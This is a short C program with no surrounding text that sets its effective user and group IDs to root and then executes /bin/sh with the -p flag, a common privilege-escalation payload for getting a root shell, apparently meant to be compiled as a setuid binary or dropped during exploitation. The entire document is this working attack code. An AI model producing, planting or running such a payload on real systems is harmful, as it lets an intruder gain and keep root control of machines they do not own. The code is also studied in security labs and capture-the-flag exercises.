int main(){
  seteuid(0);
  setegid(0);
  char *name[3];

  name[0] = "/bin/sh";
  name[1] = "-p";
  name[2] = 0x0;
  execve(name[0], name, 0x0);
  exit(0);
}
